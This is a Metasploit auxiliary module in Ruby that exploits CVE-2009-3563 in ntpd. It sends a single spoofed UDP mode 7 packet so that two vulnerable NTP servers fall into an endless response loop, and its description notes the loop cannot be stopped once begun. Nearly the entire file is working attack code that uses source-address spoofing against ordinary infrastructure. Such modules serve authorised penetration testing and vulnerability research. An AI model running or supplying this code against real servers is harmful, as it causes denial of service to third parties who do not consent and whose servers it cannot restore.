##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Capture
	include Msf::Auxiliary::Scanner

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'NTP.org ntpd Reserved Mode Denial of Service',
			'Description'    => %q{
				This module exploits a denial of service vulnerability
				within the NTP (network time protocol) demon. By sending
				a single packet to a vulnerable ntpd server (Victim A),
				spoofed from the IP address of another vulnerable ntpd server
				(Victim B), both victims will enter an infinite response loop.
				Note, unless you control the spoofed source host or the real
				remote host(s), you will not be able to halt the DoS condition
				once begun!
			},
			'Author'         => [ 'todb' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'BID', '37255' ],
					[ 'CVE', '2009-3563' ],
					[ 'OSVDB', '60847' ],
					[ 'URL', 'https://support.ntp.org/bugs/show_bug.cgi?id=1331' ]
				],
			'DisclosureDate' => 'Oct 04 2009'))

			register_options(
				[
					OptAddress.new('LHOST', [true, "The spoofed address of a vulnerable ntpd server" ])
				], self.class)

			deregister_options('FILTER','PCAPFILE')

	end

	def run_host(ip)
		open_pcap

		print_status("Sending a mode 7 packet to host #{ip} from #{datastore['LHOST']}")

		p = PacketFu::UDPPacket.new
		p.ip_saddr = datastore['LHOST']
		p.ip_daddr = ip
		p.ip_ttl = 255
		p.udp_src = 123
		p.udp_dst = 123
		p.payload = ["\x17", "\x97\x00\x00\x00"][rand(2)]
		p.recalc
		capture_sendto(p,ip)

		close_pcap
	end

end
